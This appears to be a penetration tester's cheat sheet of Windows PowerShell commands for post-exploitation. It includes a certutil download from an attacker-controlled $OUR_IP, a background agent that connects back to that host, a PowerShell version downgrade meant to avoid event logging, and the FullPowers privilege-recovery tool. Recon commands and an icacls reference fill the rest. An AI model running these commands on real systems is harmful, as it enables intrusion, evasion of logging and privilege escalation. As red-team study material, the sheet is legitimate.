# Tricks

```powershell
# Download files if iwr doesn't work
certutil.exe -f -urlcache http://$OUR_IP/example.txt example.txt

# Run an executable as a process in the background
Start-Process -FilePath '.\agent.exe' -ArgumentList '-connect $OUR_IP:11601 -retry -ignore-cert' -NoNewWindow

# Check for defender
Get-MpPreference
# CMD equivalent
sc query windefend

# Check firewall
netsh advfirewall show allprofiles

# Stop processes
Get-Process $PROCESS_NAME | Stop-Process
Get-Process | Where-Object { $_.ProcessName -like '*$PROCESS_NAME*' } | Stop-Process

# Open explorer in the current directory
Invoke-Item .

# Check inbound/outbound firewall rules
netsh advfirewall firewall show rule name=all dir=in
netsh advfirewall firewall show rule name=all dir=out

# Check ARP table
arp -a

# Check environment variables
Get-ChildItem env:

# List permissions
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-Acl Microsoft | Select-Object -ExpandProperty Owner

# Query registry key
reg query 'HKLM\SOFTWARE\Key' /s
reg query 'HKLM\SOFTWARE\Key' /v EncKey

# Downgrade powershell version (prevents actions from being logged in Event Viewer)
powershell.exe -version 2
```

**Notable Groups:**

```bash
Administrators             # Full control
Remote Desktop Users       # Remote access via RDP
Remote Management Users    # Remote access via WinRM
```

`icacls` permissions mask table (ACE = access control entry)

- `F` - Full access
- `M` - Modify access
- `RX` - Read and execute access
- `R` - Read-only access
- `W` - Write-only access

Inheritance rights ([MSDN](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls))

- `I` - Inherit. ACE inherited from the parent container
- `OI` - Object inherit. Objects in this container will inherit this ACE. Applies only to directories.
- `CI` - Container inherit. Containers in this parent container will inherit this ACE. Applies only to directories.
- `IO` - Inherit only. ACE inherited from the parent container, but does not apply to the object itself. Applies only to directories.
- `NP` - Do not propagate inherit. ACE inherited by containers and objects from the parent container, but does not propagate to nested containers. Applies only to directories.

**Role is `nt authority\local service` without `SeImpersonatePrivilege` present:**

Commonly the role for a web server running on a windows computer (such as `xampp`)

[FullPowers](https://github.com/itm4n/FullPowers)

```powershell
.\FullPowers.exe
```
